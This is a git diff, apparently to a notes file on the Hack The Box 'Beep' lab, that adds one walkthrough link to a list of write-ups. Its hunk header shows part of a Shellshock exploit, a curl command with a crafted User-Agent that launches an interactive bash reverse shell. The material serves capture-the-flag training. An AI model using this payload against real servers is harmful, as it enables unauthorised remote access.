@@ -233,6 +233,7 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 + https://vvmlist.github.io/#beep
 + https://0xdf.gitlab.io/2021/02/23/htb-beep.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/beep-writeup-w-o-metasploit
++ https://benheater.com/hackthebox-beep/
 + https://mertle.medium.com/write-up-htb-beep-9b4159ca3005
 + https://medium.com/@siddharth.singhal1995/hackthebox-walkthrough-beep-5-60e29ad0668a
 + https://www.siberportal.org/red-team/penetration-testing/hack-the-box-beep-cozumu/
